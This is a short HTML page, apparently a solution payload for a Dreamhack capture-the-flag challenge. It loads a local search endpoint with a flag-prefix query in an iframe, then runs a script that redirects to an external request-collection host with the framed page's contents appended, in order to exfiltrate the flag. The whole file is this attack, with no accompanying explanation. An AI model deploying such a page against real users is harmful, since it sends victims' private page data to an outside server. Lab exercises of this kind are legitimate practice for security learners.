<html>
  <body>

      <iframe src="http://127.0.0.1:8000/search?query=DH{" id="query"></iframe>
        <iframe src="https://ufhnazq.request.dreamhack.games/" id="target"></iframe>
  </body>
  <script>
    location = 'https://ufhnazq.request.dreamhack.games/' + document.getElementById("query").contentWindow.document.innerHTML
  </script>
</html>
